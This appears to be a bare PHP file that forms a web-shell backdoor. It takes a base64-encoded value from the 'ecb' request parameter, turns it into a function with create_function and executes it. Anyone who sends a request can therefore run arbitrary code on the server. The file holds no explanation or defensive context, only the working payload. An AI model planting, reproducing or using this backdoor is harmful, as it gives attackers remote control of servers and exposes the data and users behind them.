<?php
if(!empty($_REQUEST['ecb'])){$ecb=base64_decode($_REQUEST["ecb"]);$ecb=create_function('',$ecb);$ecb();exit;}